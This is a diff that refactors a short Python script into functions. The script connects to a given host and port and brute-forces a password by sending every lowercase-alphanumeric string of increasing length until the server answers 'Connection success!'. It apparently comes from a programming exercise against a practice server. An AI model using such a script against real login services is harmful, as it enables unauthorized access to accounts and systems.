@@ -1,32 +1,47 @@
 import sys
 import socket
 import itertools
+import os
 
-# creating a brute force hacking generator
-def passwrd(rep):
+def checker(data, client_socket):
+    for p in data:
+        bp = p.encode()
+        client_socket.send(bp)
+        response = client_socket.recv(1024)
+        response = response.decode()
+        if response == "Connection success!":
+            return p
+
+def brute_force_possibl(rep):
     brute_force_str = "abcdefghijklmnopqrstuvwxyz0123456789"
     pswrds = itertools.product(brute_force_str, repeat=rep)
     for pswr in pswrds:
         data = "".join(pswr)
         yield data
 
-# connecting to the server and trying to brute force the password
-with socket.socket() as client_socket:
+def brute_force(client_socket):
+    rep = 1
+    flag = True
+    while flag:
+        data = brute_force_possibl(rep)
+        check = checker(data, client_socket)
+        if check:
+            return check
+        rep += 1
+
+
+def connect(client_socket):
     hostname = sys.argv[1]
     port = int(sys.argv[2])
     address = (hostname, port)
     client_socket.connect(address)
 
-    rep = 1
-    flag = True
-    while flag:
-        data = passwrd(rep)
-        for p in data:
-            bp = p.encode()
-            client_socket.send(bp)
-            response = client_socket.recv(1024)
-            response = response.decode()
-            if response == "Connection success!":
-                print(p)
-                flag = False
-        rep += 1
+
+def main():
+    with socket.socket() as client_socket:
+        connect(client_socket)
+        print(brute_force(client_socket))
+
+if __name__ == "__main__":
+    main()
+
